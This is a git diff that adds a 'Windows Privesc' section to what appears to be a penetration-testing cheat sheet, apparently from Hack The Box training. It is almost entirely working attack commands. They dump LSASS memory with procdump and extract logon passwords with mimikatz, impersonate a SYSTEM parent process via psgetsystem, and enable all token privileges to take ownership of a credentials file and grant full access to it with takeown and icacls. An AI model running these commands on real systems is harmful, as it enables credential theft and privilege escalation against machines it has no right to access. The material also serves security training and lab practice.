@@ -315,3 +315,47 @@ if (strcmp($username, $_POST['username']) == 0)
 <img width="775" height="372" alt="image" src="https://github.com/user-attachments/assets/8cfd0a24-61ef-425f-8354-9d05d5c0c5e8" />
 
 </details>
+
+---
+<details>
+  <summary><strong>Windows Privesc</strong></summary>
+  
+## SeDebugPrivilege
+- `Task Manager > Details > choose LSASS > right click > Create dump file`
+```powershell
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+```
+mimikatz.exe
+
+log
+
+sekurlsa::minidump lsass.dmp
+
+sekurlsa::logonpasswords
+```
+
+- `https://github.com/decoder-it/psgetsystem`
+```powershell
+. .\psgetsys.ps1
+
+ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
+```
+
+## SeTakeOwnershipPrivilege
+- `https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1`
+```powershell
+Import-Module .\Enable-Privilege.ps1
+
+.\EnableAllTokenPrivs.ps1
+
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+
+</details>
